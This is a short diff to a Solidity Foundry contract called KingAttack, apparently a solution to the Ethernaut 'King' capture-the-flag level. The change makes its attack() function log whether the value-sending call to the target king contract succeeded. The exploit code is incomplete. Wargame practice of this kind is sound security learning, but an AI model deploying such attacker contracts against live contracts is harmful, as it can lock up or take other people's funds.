@@ -2,7 +2,7 @@
 
 pragma solidity ^0.6.2;
 
-import {Script} from "forge-std/Script.sol";
+import {Script, console} from "forge-std/Script.sol";
 
 import {Constants} from "./Constants.s.sol";
 
@@ -15,7 +15,8 @@ contract KingAttack is Constants {
     }
     
     function attack() public {
-        KING_ADDRESS.call{value: i_prize}("");
+        (bool success, ) = KING_ADDRESS.call{value: i_prize}("");
+        console.log("Success: ", success);
     }
 
     receive() external payable {
